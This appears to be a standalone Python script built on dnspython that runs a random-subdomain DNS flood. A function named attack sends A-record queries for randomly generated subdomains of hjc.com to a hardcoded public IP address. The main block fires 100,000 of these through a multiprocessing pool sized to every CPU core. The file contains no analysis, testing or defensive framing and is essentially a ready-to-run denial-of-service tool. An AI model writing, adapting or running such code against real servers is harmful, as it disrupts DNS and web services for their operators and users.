from dns import message, query
import random
import string
import multiprocessing
import threading


def FlagCount(flags, pos):
    if int(flags / (2**pos)) % 2 == 1:
        return True
    else:
        return False


def GetFlags(flags):
    QR_pos = 15
    AA_pos = 10
    TC_pos = 9
    RD_pos = 8
    RA_pos = 7
    QR_flag = FlagCount(flags, QR_pos)
    AA_flag = FlagCount(flags, AA_pos)
    TC_flag = FlagCount(flags, TC_pos)
    RD_flag = FlagCount(flags, RD_pos)
    RA_flag = FlagCount(flags, RA_pos)
    flag_dic = {
        "QR": QR_flag,
        "AA": AA_flag,
        "TC": TC_flag,
        "RD": RD_flag,
        "RA": RA_flag
    }
    for flag, v in flag_dic.items():
        print(flag, ':', v)


def attack(domain_name):
    server = '47.104.185.138'
    port = 80
    dns_query = message.make_query(domain_name, 'A')
    response = query.udp(dns_query, server, port)
    # print(response)


def generate_random_name():
    ch = list(string.ascii_lowercase) + list(map(str, range(10)))
    rand_ch = random.sample(ch, random.randint(3, 10))
    return ''.join(rand_ch)


def start_attack():
    domain_name = generate_random_name() + '.hjc.com'
    attack(domain_name)
    print(domain_name)


if __name__ == '__main__':
    p = multiprocessing.Pool(processes=multiprocessing.cpu_count())
    for _ in range(100000):
        p.apply_async(start_attack)
    p.close()
    p.join()
    # print(response)
    # for content in response.answer:
    #     print(content.to_text())
    # GetFlags(response.flags)